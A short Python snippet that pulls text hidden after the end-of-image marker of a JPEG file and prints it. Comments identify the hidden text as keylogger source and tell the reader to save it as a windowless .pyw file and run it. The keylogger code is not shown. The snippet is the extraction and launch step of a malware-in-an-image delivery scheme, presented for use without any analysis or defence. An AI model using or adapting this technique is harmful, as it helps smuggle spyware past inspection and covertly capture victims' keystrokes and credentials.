with open('photo.jpg', 'rb') as f:
    content = f.read()
    offset = content.index(bytes.fromhex('FFD9'))
    f.seek(offset + 2)
    data = f.read()
data = data.decode('utf-8')
print(data)
#this data is now the keylogger python code,
#paste it into a new .pyw file and execute